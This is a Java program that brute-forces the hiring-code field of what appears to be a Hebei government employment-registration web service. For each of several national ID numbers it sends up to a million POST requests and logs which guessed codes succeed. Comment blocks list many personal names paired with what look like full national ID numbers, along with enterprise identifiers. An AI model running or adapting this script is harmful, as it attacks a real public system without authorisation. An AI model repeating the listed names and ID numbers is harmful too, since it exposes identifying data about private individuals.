import org.apache.log4j.Logger;

import java.io.IOException;
import java.net.URLDecoder;

/****
 58967332-X   HBAH83618636  b97a1a73-855e-4440-be76-d6c5af0c7a1b

 76517823-0   hbjp1234    72649ce4-5a43-47b0-b025-2f7708c79578
 130181199108303016
 键	值
 Referer	http://sfxxcj.hebjs.gov.cn/PersEmploy.html?QYID=b97a1a73-855e-4440-be76-d6c5af0c7a1b
 键	值                                                      b97a1a73-855e-4440-be76-d6c5af0c7a1b
 Content-Type	application/x-www-form-urlencoded
 键	值
 Host	sfxxcj.hebjs.gov.cn
 http://sfxxcj.hebjs.gov.cn/ashx/PersEmploy.ashx

 */
public class http {

    public static Logger logger = Logger.getLogger("http");
    public static  void  main(String args[]){


        /**
         魏俊英  372526197310171023             1
         王海亮  410522198111157712
         马玉印  410522197205317719
         崔月志  132129198204034014
         任洪顺  230221197603244838
         常希成  132323198102061014
         崔海青  132129197105104019
         牛国梁  130434197702216938
         崔海军 132129198108084011



         宋静宇  130423198601270068
         王敏130404196211090020
         于金考  130130198502212417
         曹建波 130434199007041637
         梁海山  13042319930520401X
         杨震  130430199002161917
          王敏 130404196211090020
         于金考  130130198502212417          1
         */
        //身份证      崔彦平  130423198908234010

        /**
         二次
         "410522197205317719,"+
         "132129198204034014,"+
         "230221197603244838,"+
         "132323198102061014,"+
         "132129197105104019,"+
         "130434197702216938,"+
         "130404196211090020,"+
         "130130198502212417,"+
         "130430199002161917";
         */

//        "410922197010024934,"+
//                "132129197812254016";
        String txtIDCards =
//                "410522198001137737,"+
//                 "410522197904017715,"+
//                "130106198505100015,"+
//                        "410522198001137737,"+
//                        "130185199511094010,"+
//                        "130133198911141815,"+
                        "130106198505100015,"+
                        "130122197006114311";
//                        "130404196211090020,"+
//                        "130130198502212417,"+
//                         "130122197006114311,"+
//                        "130106198505100015";
        String[] a = txtIDCards.split(",");
        for(int j=0;j<a.length;j++){
            //企业id
            String QYID = "72649ce4-5a43-47b0-b025-2f7708c79578";

            String txtIDCard = a[j];

            HttpUtilTest httpUtilTest = new HttpUtilTest();

            String url = "http://sfxxcj.hebjs.gov.cn/ashx/PersEmploy.ashx";

//                "action": "persSelectByHand",
//                //"txtName": escape(txtName),
//                "txtPinyongCode": escape(txtPinyongCode),   聘用码
//                "txtIDCard": escape(txtIDCard),          身份证
//                "IDCardTypeNum": escape(IDCardTypeNum),   1
//                "QYID": escape(urlParms.QYID)  b97a1a73-855e-4440-be76-d6c5af0c7a1b

//            switch (data) {
//                case "ok": alert("人员聘用成功！"); break;
//                case "noRegister": alert("该人员未进行实名注册，请选择身份识别进行实名认证！"); break;
//                case "exist": alert("该人员已被聘用！"); break;
//                case "noMatch": alert("输入身份证号码与聘用码不匹配！"); break;
//                default: alert("服务器内部错误！");
//            }

            String txtPinyongCode = "";
            for(int i=0;i<=999999;i++){
                txtPinyongCode = String.format("%04d", i);

                String para = "action=" +EscapeUnescape.escape("persSelectByHand")+
                        "&txtPinyongCode=" +EscapeUnescape.escape(txtPinyongCode)+
                        "&txtIDCard=" +EscapeUnescape.escape(txtIDCard)+
                        "&IDCardTypeNum=" +EscapeUnescape.escape("1")+
                        "&QYID="+EscapeUnescape.escape(QYID);

                try {
                    String response = httpUtilTest.sendPost(url,para);
                    System.out.println("人员编号："+txtIDCard+"正在试验聘用码："+txtPinyongCode+"————结果："+response);
                    if(response.contains("ok")){
                        logger.info("人员编号："+txtIDCard+"----聘用码："+txtPinyongCode);
                    }else if(response.contains("exist")){
                        logger.info("人员编号："+txtIDCard+"已聘用");
                        break;
                    }else if(response.contains("noRegister")){
                        logger.info("人员编号："+txtIDCard+"未实名");
                        break;
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }



    }
}
